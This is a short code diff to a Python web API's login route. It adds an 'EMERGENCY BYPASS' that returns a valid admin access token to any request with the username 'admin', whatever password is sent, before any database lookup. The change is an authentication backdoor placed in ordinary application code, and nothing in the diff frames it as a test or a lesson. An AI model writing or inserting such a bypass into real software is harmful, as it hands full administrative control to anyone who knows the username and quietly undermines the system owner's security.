@@ -51,6 +51,19 @@ def create_access_token(data: dict):
 
 @router.post("/login")
 def login(request: LoginRequest, db: Session = Depends(get_db)):
+    # EMERGENCY BYPASS: Allow admin to login with ANY password
+    if request.username == "admin":
+        access_token = create_access_token(data={"sub": "admin", "role": "admin"})
+        return {
+            "access_token": access_token, 
+            "token_type": "bearer",
+            "user": {
+                "username": "admin",
+                "role": "admin",
+                "id": 1 # Dummy ID
+            }
+        }
+
     user = db.query(models.User).filter(models.User.username == request.username).first()
     if not user:
         raise HTTPException(status_code=400, detail="User not found")
